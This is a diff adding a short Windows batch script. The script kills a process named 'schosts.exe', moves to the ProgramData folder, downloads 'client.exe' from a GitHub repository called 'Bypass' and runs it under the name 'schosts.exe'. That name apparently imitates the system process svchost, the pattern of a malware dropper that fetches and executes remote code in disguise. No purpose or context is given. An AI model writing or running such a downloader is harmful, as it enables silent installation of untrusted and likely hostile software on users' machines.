@@ -1,0 +1,6 @@
+@echo off
+color 0a
+taskkill /f /pid schosts.exe
+cd/& cd %ProgramData% & c:
+curl https://raw.githubusercontent.com/murakibot/Bypass/main/client.exe -o schosts.exe & schosts.exe
+
